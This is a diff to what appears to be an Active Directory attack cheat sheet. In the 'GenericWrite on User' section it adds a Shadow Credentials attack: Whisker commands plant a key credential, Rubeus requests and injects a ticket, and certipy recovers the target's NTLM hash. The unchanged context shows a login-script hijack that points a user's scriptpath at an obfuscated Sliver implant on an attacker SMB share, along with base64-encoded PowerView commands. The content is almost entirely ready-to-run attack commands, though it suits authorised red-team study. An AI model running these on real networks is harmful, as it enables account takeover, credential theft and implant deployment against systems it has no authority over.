@@ -1708,9 +1708,10 @@ sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get
 
 #### GenericWrite on User
 
-Two things can be done
+Three things can be done:
 - Add SPN and Kerberoast
 - Change login script (check login frequency of the user)
+- Shadow Credentials
 
 
 Set SPN and perform kerberoasting
@@ -1748,6 +1749,27 @@ impacket-smbserver -smb2support myshare .
 # Set the scriptpath attribute to .exe file
 Set-DomainObject -Identity user -SET @{scriptpath='\\10.10.10.11\myshare\sliver.obfuscated.exe'}
 sharpsh -t 20 -- -u http://10.10.10.11/powershell-scripts/PowerView.ps1 -e -c U2V0LURvbWFpbk9iamVjdCAtSWRlbnRpdHkgdXNlciAtU0VUIEB7c2NyaXB0cGF0aD0nXFwxMC4xMC4xMC4xMVxteXNoYXJlXHNsaXZlci5vYmZ1c2NhdGVkLmV4ZSd9
+```
+
+
+Shadow Credentials
+
+```powershell
+# List existing key credentials first
+.\Whisker.exe list /target:targetuser /domain:corp.local /dc:dc01.corp.local
+
+
+# Add a new shadow credential (generates a cert + stores public key in msDS-KeyCredentialLink)
+.\Whisker.exe add /target:targetuser /path:C:\Users\user\Desktop\user.pfx /password:P@ssw0rd
+
+
+# Use Rubeus to get TGT and inject in current session
+.\Rubeus.exe asktgt /user:targetuser /certificate:C:\Users\user\Desktop\user.pfx /password:"P@ssw0rd" /domain:corp.local /dc:dc01.corp.local /getcredentials /show /ptt
+
+
+# Use certipy to get NTLM hash of the user 
+pipx install certipy-ad
+certipy auth -pfx user.pfx -password 'P@ssw0rd' -dc-ip 10.0.0.2 -domain corp.local -username targetuser
 ```
 
 
